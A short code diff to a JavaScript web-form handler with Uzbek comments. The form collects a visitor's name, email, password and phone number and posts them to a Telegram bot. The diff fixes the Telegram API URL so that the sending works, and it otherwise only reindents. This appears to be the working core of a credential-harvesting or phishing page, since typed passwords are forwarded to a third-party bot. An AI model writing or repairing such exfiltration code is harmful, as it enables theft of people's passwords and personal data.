@@ -16,9 +16,9 @@ if (form && statusText) {
         var name = (nameInput === null || nameInput === void 0 ? void 0 : nameInput.value) || '';
         var call = (callInput === null || callInput === void 0 ? void 0 : callInput.value) || '';
         var text = "\n\uD83D\uDCDD Yangi forma xabari:\n\uD83D\uDC68    ism: ".concat(name, "\n\uD83D\uDCE7    email: ").concat(email, "\n\uD83D\uDD11    parol: ").concat(password, "\n\uD83D\uDCDE    telefon: ").concat(call, "\n    ");
-        
-        // MANZIL TO'LIQ TUZATILDI: Rasmiy Telegram API manzili qo'yildi
-        fetch("https://telegram.org" + BOT_TOKEN + "/sendMessage", {
+
+        // Telegram API manzili to'g'ri tuzildi
+        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -29,16 +29,16 @@ if (form && statusText) {
             }),
         })
             .then(function (res) {
-            if (statusText && form) {
-                statusText.textContent = 'Xabar muvaffaqiyatli yuborildi!';
-                form.reset();
-            }
-        })
+                if (statusText && form) {
+                    statusText.textContent = 'Xabar muvaffaqiyatli yuborildi!';
+                    form.reset();
+                }
+            })
             .catch(function (err) {
-            if (statusText) {
-                statusText.textContent = 'Xatolik yuz berdi!';
-            }
-            console.error("Telegram error:", err);
-        });
+                if (statusText) {
+                    statusText.textContent = 'Xatolik yuz berdi!';
+                }
+                console.error("Telegram error:", err);
+            });
     });
 }
